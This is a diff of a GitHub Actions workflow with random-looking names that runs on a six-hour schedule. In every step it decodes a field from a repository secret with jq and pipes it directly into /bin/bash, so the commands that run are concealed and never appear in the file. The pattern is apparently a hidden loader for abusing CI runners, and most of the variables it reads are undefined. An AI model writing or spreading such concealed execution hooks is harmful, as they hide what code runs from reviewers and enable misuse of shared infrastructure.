@@ -3,28 +3,21 @@ name: wuyanjing1990
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 2/6 * * *'
+    - cron: '23 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wuyanjing1990
         env:
-          z14526: ${{ secrets.z14526 }}
+          s138: ${{ secrets.s138 }}
         run: |
-          echo $z14526 | jq -r .s26460 | /bin/bash
-          echo $msifv0 | jq -r .pbp4356 | /bin/bash
-          echo $y92011 | jq -r .xt677 | /bin/bash
-          echo $ydtm6666 | jq -r .rcapu22 | /bin/bash
-          echo $magrj02676 | jq -r .utwu4626 | /bin/bash
-          echo $lnlb18806 | jq -r .d750 | /bin/bash
-          echo $a642 | jq -r .phi3 | /bin/bash
-          echo $hotm88878 | jq -r .zwv1 | /bin/bash
-          echo $zi41 | jq -r .p3 | /bin/bash
-          echo $xnrhi42 | jq -r .q7942 | /bin/bash
-          echo $xca54 | jq -r .nnjj50600 | /bin/bash
-          echo $iwmr40136 | jq -r .ac10208 | /bin/bash
-          echo $a20526 | jq -r .nnzw14 | /bin/bash
+          echo $s138 | jq -r .jnmsc7 | /bin/bash
+          echo $zpw7 | jq -r .lwbo53 | /bin/bash
+          echo $biavf9 | jq -r .zp4309 | /bin/bash
+          echo $gx5 | jq -r .nr54999 | /bin/bash
+          echo $lrtg54535 | jq -r .eyn79 | /bin/bash
+          echo $l3 | jq -r .hmfa7 | /bin/bash
 
